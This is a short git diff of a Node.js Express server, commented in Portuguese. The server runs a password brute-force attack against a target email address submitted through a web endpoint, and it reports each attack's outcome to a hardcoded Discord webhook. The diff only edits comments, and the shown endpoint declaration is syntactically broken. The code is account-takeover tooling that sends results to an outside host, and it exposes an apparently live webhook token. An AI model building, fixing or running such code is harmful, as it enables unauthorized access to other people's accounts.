@@ -6,7 +6,7 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// URL DO WEBHOOK DO DISCORD (Hardcoded conforme pedido)
+// URL DO WEBHOOK DO DISCORD
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
 
 app.use(express.json());
@@ -125,7 +125,7 @@ async function startBruteForce(email) {
     if (!found) {
         await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}\n*Nenhuma senha da lista funcionou.*`);
     }
-}
+} // <--- VERIFICAR SE ESTA CHAVE FECHA A FUNÇÃO startBruteForce
 
 // ENDPOINT: Receber o Email do Site e Iniciar o Ataque
 app.post('/start-brute-force', async (req, res) {
